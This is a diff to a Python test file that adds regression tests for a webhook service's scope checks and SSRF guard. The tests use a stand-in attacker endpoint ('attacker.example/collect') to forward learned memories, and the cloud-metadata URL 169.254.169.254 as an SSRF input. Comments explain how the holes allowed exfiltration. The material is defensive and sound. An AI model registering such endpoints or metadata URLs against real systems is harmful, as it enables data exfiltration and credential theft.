@@ -41,7 +41,15 @@ def mock_redis():
 def app_with_webhooks(mock_redis):
     """Create a FastAPI test app with the webhook router."""
     app = FastAPI()
-    router = create_webhook_router(mock_redis)
+    # The routes are scope-gated (admin for mutations, memory:read for reads), and that
+    # gate bites even on the AUTH_ENABLED=false path. These tests assert the routes' OWN
+    # logic, so they build the router with the gate stubbed at CONSTRUCTION time (the
+    # dependency is captured at decoration). Patch `app.webhooks.require_scope`, not the
+    # source module — webhooks.py holds its own reference from an import-time `from`.
+    # Safe only because test_webhook_mutating_routes_refuse_anonymous_when_auth_disabled
+    # exercises the real gate. Mirrors app/ops.py's and transfer's precedent.
+    with patch("app.webhooks.require_scope", lambda scope: (lambda: _ADMIN)):
+        router = create_webhook_router(mock_redis)
     app.include_router(router)
     return app
 
@@ -341,3 +349,74 @@ class TestWebhookErrorHandling:
             event_type="memory.learned",
             payload={"test": True},
         )
+
+
+# --- scope gate + SSRF guard (2026-08-02) ----------------------------------
+# Found by adversarial review of eded76a: that commit gated /memory/export and
+# /memory/import, but the same defect sat one file over on a strictly more
+# powerful surface. A registered webhook is a PERSISTENT forward of every memory
+# learned (main.py:1306 fires memory.learned with the memory body) plus an
+# arbitrary outbound-POST primitive from inside the trust boundary.
+_ADMIN = {"agent_id": "test-admin", "scopes": ["*"], "authenticated": True}
+
+
+def test_webhook_mutating_routes_refuse_anonymous_when_auth_disabled():
+    """Registration, deletion and test-fire answered ANY caller: no route declared a
+    dependency and main.py:267 registered the router without `dependencies=`. The
+    global key middleware only proves a key exists — it performs no scope check — so
+    under AUTH_ENABLED=true any non-admin teammate key sufficed, and with auth off no
+    key at all."""
+    from auth import keys as _keys
+
+    assert _keys._AUTH_ENABLED is False, "this test is about the auth-DISABLED path"
+    assert "admin" not in _keys.ANONYMOUS_SCOPES
+
+    test_app = FastAPI()
+    test_app.include_router(create_webhook_router(AsyncMock()))  # the REAL gate
+    client = TestClient(test_app)
+
+    body = {"url": "https://attacker.example/collect",
+            "events": ["memory.learned"], "namespace": "default"}
+    for method, path, payload in (
+        ("post", "/webhooks/", body),
+        ("delete", "/webhooks/abc", None),
+        ("post", "/webhooks/abc/test", None),
+    ):
+        resp = (client.post(path, json=payload) if method == "post"
+                else client.delete(path))
+        assert resp.status_code == 403, f"{method.upper()} {path} -> {resp.status_code}"
+
+
+def test_internal_fire_stays_reachable_for_the_internal_key():
+    """`/internal/fire` is deliberately memory:write, NOT admin — it is the
+    service-to-service route Sentinel and Bridge POST to, and FIREKEEP_INTERNAL_KEY is
+    explicitly minted WITHOUT admin (scopes: memory:write, session:read, eval:read,
+    eval:write). Gating it admin would silently break both callers.
+
+    A consequence worth stating rather than hiding: memory:write is in ANONYMOUS_SCOPES,
+    so with AUTH_ENABLED=false this route still answers anonymously. That matches the
+    documented posture — auth off means everything below admin is open on a
+    loopback-bound deployment — and the exfiltration path is closed regardless, because
+    REGISTERING an endpoint requires admin. This test guards the Sentinel/Bridge
+    contract: it fails if someone tightens this route to admin.
+
+    event_type is a required query param; omitting it 422s before the dependency is
+    solved, which would mask the gate rather than exercise it.
+    """
+    test_app = FastAPI()
+    test_app.include_router(create_webhook_router(AsyncMock()))  # the REAL gate
+    client = TestClient(test_app)
+    resp = client.post("/webhooks/internal/fire?event_type=memory.learned")
+    assert resp.status_code != 403, "admin here would break Sentinel and Bridge"
+
+
+def test_webhook_registration_rejects_internal_addresses(app_with_webhooks):
+    """The URL was validated for SCHEME only (webhooks.py:91), so the cloud-metadata
+    address was accepted and every subsequent memory forwarded to it. cortex already
+    ships an SSRF guard for exactly this — app/knowledge/crawler.py's is_safe_url —
+    and this route bypassed it."""
+    client = TestClient(app_with_webhooks)
+    resp = client.post("/webhooks/", json={
+        "url": "http://169.254.169.254/latest/meta-data/",
+        "events": ["memory.learned"], "namespace": "default"})
+    assert resp.status_code == 400, f"-> {resp.status_code}"
